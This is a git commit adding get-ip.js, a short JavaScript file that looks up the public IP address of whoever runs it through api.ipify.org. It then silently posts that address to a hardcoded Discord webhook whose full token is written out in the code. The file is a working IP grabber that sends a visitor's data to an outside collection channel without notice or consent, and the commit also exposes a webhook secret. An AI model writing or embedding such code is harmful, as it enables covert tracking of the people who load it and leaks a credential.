0c0e70459f38ba43a7554ad433ea358ed5b94996
specimencode <135075815+specimencode@users.noreply.github.com>
2024-09-19 17:56:49 -0400

    Create get-ip.js

---
+++ get-ip.js
@@ -0,0 +1,14 @@
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        const ip = data.ip;
+        const webhookUrl = 'https://discord.com/api/webhooks/1286431414010642527/J1GrvAUXb343h0cUsonj4sTQqWqCCxTWjoEtTxGXMsPiwFYNoafYpXmMBKnZulV2fNPt';
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            body: JSON.stringify({ content: `IP: ${ip}` }),
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+    });
